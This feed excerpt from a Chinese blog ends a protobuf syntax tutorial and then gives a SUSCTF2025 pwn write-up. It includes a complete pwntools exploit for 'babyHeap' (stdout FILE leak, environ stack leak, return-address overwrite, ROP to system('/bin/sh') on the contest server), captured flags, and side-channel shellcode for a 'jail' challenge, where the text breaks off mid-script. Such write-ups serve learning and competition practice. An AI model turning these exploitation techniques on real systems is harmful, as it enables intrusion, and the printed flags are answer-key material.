href="#定义与声明数据" class="headerlink" title="定义与声明数据"></a>定义与声明数据</h2><p>对于<code>proto3</code>，可以使用<code>数据类型 变量名 = 字段编号</code>来定义和声明数据类型。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"><span class="comment">//  数据类型 变量名 = 字段编号;</span></span><br><span class="line"><span class="comment">//  定义一个age变量,字段编号;</span></span><br><span class="line"><span class="comment">//  字段编号必须是1~2^31-1</span></span><br><span class="line"><span class="comment">// 19000 ~ 19999(系统保留)</span></span><br><span class="line"><span class="type">uint32</span> age = <span class="number">1</span>; </span><br></pre></td></tr></table></figure><p>注意：字段编号是字段编号，而不是这些变量的默认值，在<code>protbuf</code>中会自动给变量赋予一个默认值。各种类型的默认值如下：</p><div class="table-container"><table><thead><tr><th>字段类型</th><th>默认值</th></tr></thead><tbody><tr><td>数值类型<code>int32 uint32</code>等</td><td><code>0</code></td></tr><tr><td>字符串</td><td><code>&quot;&quot;</code>（空字符串）</td></tr><tr><td>bool</td><td><code>false</code></td></tr><tr><td>枚举</td><td>枚举中值为<code>0</code>的项</td></tr><tr><td>message</td><td><code>nil/None</code>（未设置）</td></tr></tbody></table></div><p>对于<code>proto2</code>来说，可以使用<code>标记词 变量名 = 字段编号;</code>来定义和声明数据类型。例子如下：</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> tutorial;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面需要使用标记词来,定义消息里面的变量</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Person</span>&#123;</span><br><span class="line"><span class="keyword">required</span> <span class="type">string</span> name = <span class="number">1</span>; <span class="comment">// 必须字段</span></span><br><span class="line"><span class="keyword">optional</span> <span class="type">int32</span> id = <span class="number">2</span>;  <span class="comment">// 可选字段</span></span><br><span class="line"><span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>; <span class="comment">// 可选字段</span></span><br><span class="line"><span class="keyword">repeated</span> <span class="type">string</span> phone_number = <span class="number">4</span>; <span class="comment">//重复字段(数组)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="标记词"><a href="#标记词" class="headerlink" title="标记词"></a>标记词</h2><ul><li>标记词在<code>proto2</code>中定义变量是必须要修饰的，而<code>proto3</code>在定义变量的时候默认使用<code>optional</code>修饰，不必要求用户显式的定义声明。接下来介绍一下这些标记词。</li></ul><div class="table-container"><table><thead><tr><th>标记词</th><th>含义</th><th>说明</th></tr></thead><tbody><tr><td><code>required</code>（proto3已经被移除）</td><td>必须字段</td><td>必须赋值，如果不赋值序列化会失败，反序列化可能也会出错</td></tr><tr><td><code>optional</code></td><td>可选字段</td><td>可以设置；不设置时会使用默认值</td></tr><tr><td><code>repeated</code></td><td>可重复字段</td><td>类似数组或列表，可出现多次</td></tr></tbody></table></div><ul><li>对于<code>repeated</code>字段，表示重复字段，可以出现多次，等价于数组或者列表</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message </span><span class="title class_">Student</span> &#123;</span><br><span class="line"><span class="keyword">repeated</span> <span class="type">string</span> courses = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 序列化后的course字段可能是</span></span><br><span class="line">courser = [<span class="string">&quot;Math&quot;</span>,<span class="string">&quot;Englist&quot;</span>,<span class="string">&quot;Physics&quot;</span>]</span><br></pre></td></tr></table></figure><h1 id="proto3语法详解"><a href="#proto3语法详解" class="headerlink" title="proto3语法详解"></a>proto3语法详解</h1><h2 id="消息基本结构"><a href="#消息——基本结构" class="headerlink" title="消息——基本结构"></a>消息——基本结构</h2><ul><li>消息，也就是类似于C语言结构体的东西，是<code>protobuf</code>的核心，用于定义数据结构。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; </span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;   <span class="comment">// 用户ID</span></span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;<span class="comment">// 用户名</span></span><br><span class="line">    <span class="type">bool</span> is_active = <span class="number">3</span>; <span class="comment">// 是否活跃</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="嵌套消息"><a href="#嵌套消息" class="headerlink" title="嵌套消息"></a>嵌套消息</h2><ul><li>一个消息结构中可以嵌套另一个消息结构。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Address</span>&#123;</span><br><span class="line">    <span class="type">string</span> street = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> city = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span>&#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">    Address address = <span class="number">3</span>; <span class="comment">// 嵌套消息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举类型"><a href="#枚举类型" class="headerlink" title="枚举类型"></a>枚举类型</h2><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> my_package;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum </span><span class="title class_">UserType</span> &#123;</span><br><span class="line">    UNKNOWN = <span class="number">0</span>;</span><br><span class="line">    ADMIN = <span class="number">1</span>;</span><br><span class="line">    USER = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="type">int32</span> id = <span class="number">1</span>;</span><br><span class="line">    <span class="type">string</span> name = <span class="number">2</span>;</span><br><span class="line">    UserType type =<span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务定义"><a href="#服务定义" class="headerlink" title="服务定义"></a>服务定义</h2><ul><li>用于定义<code>RPC</code>服务的接口。</li></ul><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">service </span><span class="title class_">UserSerice</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> GetUser (UserRequest) return (UserResponse)</span>;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> ListUsers (Empty) <span class="keyword">returns</span> (stream User)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">前言：赶着ddl大概是写完了，先定个截止日期，10月15日之前</summary>
    
    
    
    <category term="其他" scheme="http://iyheart.github.io/categories/%E5%85%B6%E4%BB%96/"/>
    
    <category term="protobuf" scheme="http://iyheart.github.io/categories/%E5%85%B6%E4%BB%96/protobuf/"/>
    
    
  </entry>
  
  <entry>
    <title>SUSCTF2025-wp</title>
    <link href="http://iyheart.github.io/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/"/>
    <id>http://iyheart.github.io/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/</id>
    <published>2025-10-08T06:00:54.000Z</published>
    <updated>2025-10-08T07:15:41.016Z</updated>
    
    <content type="html"><![CDATA[<p>密码爆零了QAQ，pwn的话利用点比较简单，但是挖洞和逆向的过程非常有趣，而且题目本身出的难度不大（除了内核题。）</p><h1 id="pwn"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="babyheap"><a href="#babyHeap" class="headerlink" title="babyHeap"></a>babyHeap</h2><h3 id="babyheap-分析"><a href="#babyHeap-分析" class="headerlink" title="babyHeap-分析"></a>babyHeap-分析</h3><ul><li>做出来的时候就在想是不是非预期了，结合出题人给的提示，我应该是非预期手法做的。非预期手法其实根本不需要打<code>tcache_attack</code>。非预期的利用点在上海磐石中有考过，我也把这题作为stdout利用的例题之一了。<a href="https://iyheart.github.io/2025/07/20/CTFblog/PWN系列blog/Linux_pwn/4.IO_FILE/IO利用之stdout任意读/">IO利用之stdout任意读 | iyheart的博客</a></li><li>先查看保护机制，发现保护全开。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232303192.png" alt="image-20251006232303192"></p><ul><li>看看<code>IDA pro</code>反编译的这个程序代码，经典的堆菜单题。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232332193.png" alt="image-20251006232332193"></p><ul><li>漏洞点有两个，第一个在<code>delete</code>这边，存在一个<code>UAF</code>漏洞</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232412584.png" alt="image-20251006232412584"></p><ul><li>第二个在<code>edit</code>这边，存在数组越界</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006232511784.png" alt="image-20251006232511784"></p><ul><li>这里我只使用数组越界，不用堆的打法。这里先是数组越界到<code>-8</code>这边，修改<code>stdout</code>结构体，可以泄露<code>libc</code>的地址。</li><li>然后再使用一次数组越界，继续修改<code>stdout</code>，此时泄露<code>environ</code>这个保存在libc中的变量，该变量存储的值其实就是栈地址。</li><li>这样<code>libc、栈</code>这两个地址都有了，然后需要确定调用<code>edit</code>时返回地址存放的栈地址。</li><li>接下来就是最关键的一个点，这个点其实在<code>8</code>月份的上海磐石就已经考过了。在索引<code>-11</code>的这个地方，有一个自己指向自己的<code>.data</code>段。这就给我们提供了一次任意地址写的机会。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233111523.png" alt="image-20251006233111523"></p><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233124287.png" alt="image-20251006233124287"></p><ul><li>此时可以先调用<code>edit()</code>将<code>0x564aef61d008 ◂— 0x564aef61d008</code>，修改成<code>0x564aef61d008 —▸ stack_addr</code></li><li>之后再调用<code>edit</code>，此时这样就可以直接修改返回地址，还可以绕过<code>canary</code>。</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="comment">#p = process(&#x27;./babyHeap&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;106.14.191.23&#x27;</span>,<span class="number">53057</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;user name:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;enter user id: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;enter user id: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;choice:&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&#x27;enter user id: &#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;[+] enter new user name: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先使用UAF泄露出堆的地址以便后续利用,但是后面发现UAF没有-11索引好用就放弃了</span></span><br><span class="line">    add(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;username: &#x27;</span>)</span><br><span class="line">    leak = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] leak:&#x27;</span>,leak)</span><br><span class="line">    leak = u64(leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    key = leak</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] key:&#x27;</span>,<span class="built_in">hex</span>(key))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] leak:&#x27;</span>,<span class="built_in">hex</span>(leak))</span><br><span class="line">    heap_one = leak*(<span class="number">2</span>**<span class="number">12</span>) + <span class="number">0x2a0</span></span><br><span class="line">    heap_base = heap_one - <span class="number">0x12a0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap_one:&#x27;</span>,<span class="built_in">hex</span>(heap_one))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap_base:&#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0xFBDA1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p16(<span class="number">0x00</span>)</span><br><span class="line">    edit(-<span class="number">8</span>,payload)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    libc_leak = p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,libc_leak)</span><br><span class="line">    libc_leak = u64(libc_leak.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0x150</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0xf150</span> - <span class="number">0x21A000</span></span><br><span class="line">    <span class="keyword">elif</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0x87c</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0x87c</span> - <span class="number">0x1E2000</span></span><br><span class="line">    <span class="keyword">elif</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0xff0</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0x8BFF0</span></span><br><span class="line">    <span class="keyword">elif</span> libc_leak &amp; <span class="number">0xfff</span> == <span class="number">0x580</span>:</span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;create&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;libc_leak-----&gt;&#x27;</span>,<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">        libc_base = libc_leak - <span class="number">0x21B580</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] environ_addr:&#x27;</span>,<span class="built_in">hex</span>(environ))</span><br><span class="line">    payload = p64(<span class="number">0xFBDA1800</span>) + p64(<span class="number">0</span>)*<span class="number">3</span> + p64(environ) + p64(environ+<span class="number">8</span>)</span><br><span class="line">    edit(-<span class="number">8</span>,payload)</span><br><span class="line">    stack_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] stack_addr:&#x27;</span>,<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">    ret_addr = stack_addr - <span class="number">0x140</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    <span class="comment">#delete(2)</span></span><br><span class="line">    <span class="comment">#ret_addrr = stack_addr - 0xE9-0x8 - 0x50</span></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    <span class="comment">#delete(5)</span></span><br><span class="line">    <span class="comment">#delete(6)</span></span><br><span class="line">    edit(-<span class="number">11</span>,p64(ret_addr))</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">    <span class="comment">#add(b&#x27;a&#x27;)</span></span><br><span class="line">    pop_rdi = libc_base + <span class="number">0x2a3e5</span></span><br><span class="line">    ret = libc_base + <span class="number">0x29139</span></span><br><span class="line">    payload = p64(ret)+p64(pop_rdi) + p64(binsh_addr)+ p64(system_addr)</span><br><span class="line">    pause()</span><br><span class="line">    edit(-<span class="number">11</span>,payload)</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233413081.png" alt="image-20251006233413081"></p><h3 id="babyheap-flag"><a href="#babyHeap-flag" class="headerlink" title="babyHeap-flag"></a>babyHeap-flag</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">susctf&#123;th1s_1s_6a6y_h4@p_6842e397e2cb&#125;</span><br></pre></td></tr></table></figure><h2 id="jail"><a href="#jail" class="headerlink" title="jail"></a>jail</h2><p>真服了这题，原来是静态flag，一直舍不得重置靶机，导致后面死循环进程原来越多，爆破起来非常不流畅。然后重置一回靶机再进行爆破发现非常流畅QAQ，要是在这题花少点时间，估计还可以把密码签到题牢出来的QAQ。</p><h3 id="jail-分析"><a href="#jail-分析" class="headerlink" title="jail-分析"></a>jail-分析</h3><ul><li>查看一下保护机制，发现也是保护全开。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006233916204.png" alt="image-20251006233916204"></p><ul><li>再进行程序的逆向，发现是个沙箱题</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006234015543.png" alt="image-20251006234015543"></p><ul><li>看看沙箱，沙箱出来啥也没有，但是发现是通过<code>prctl()</code>禁用的沙箱。没有仔细了解<code>prctl()</code>的参数，但是平时做沙箱题的时候，会发现使用<code>prctl()</code>开的沙箱的程序。该程序使用<code>seccomp-tools</code>查看禁用规则常常会和输出结果相反。</li><li>这题查看的规则是什么都没禁用，那就当他什么都被禁用了，没办法直接打印，那就侧信道爆破，而且<code>flag</code>已经被读到内存中了。</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006234049092.png" alt="image-20251006234049092"></p><ul><li>调试的时候会发现存放<code>flag</code>的内存地址在栈上有出现，这样就非常好办了</li></ul><p><img src="/2025/10/08/CTFblog/write_up%E7%B3%BB%E5%88%97blog/2025%E5%B9%B4/SUSCTF2025-wp/image-20251006234721027.png" alt="image-20251006234721027"></p><ul><li>接下来就是爆破需要用到的<code>shellcode</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        pop rbx</span></span><br><span class="line"><span class="string">        mov al,0x66</span></span><br><span class="line"><span class="string">    aaa:</span></span><br><span class="line"><span class="string">        cmp al,byte ptr [rbx+1]</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        nop </span></span><br><span class="line"><span class="string">        je aaa</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>爆破的完整代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">gdbscript=<span class="string">r&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">           b *$rebase(0x1447)</span></span><br><span class="line"><span class="string">           set follow-fork-mode child</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">flag = <span class="string">&quot;susctf&#123;71m3_w1ll_t3ll_&quot;</span><span class="comment">#&quot;w1ll_t3ll_509cb0c1274d&#125;&quot;</span></span><br><span class="line"><span class="comment">#p = gdb.debug(&#x27;./jail&#x27;,gdbscript=gdbscript)</span></span><br><span class="line"><span class="comment">#i是爆破flag的索引</span></span><br><span class="line">x = <span class="string">&quot;_&#125;&quot;</span>+string.digits + string.ascii_letters + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">candidate = <span class="string">&#x27;0123456789abcdef_ABCDEFGHIJKLMNOPQRSTUVWXYZghijklmnopqrstuvwxyz&#123;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x80</span>):</span><br><span class="line">    <span class="comment"># j是爆破flag的ascii码</span></span><br><span class="line">    <span 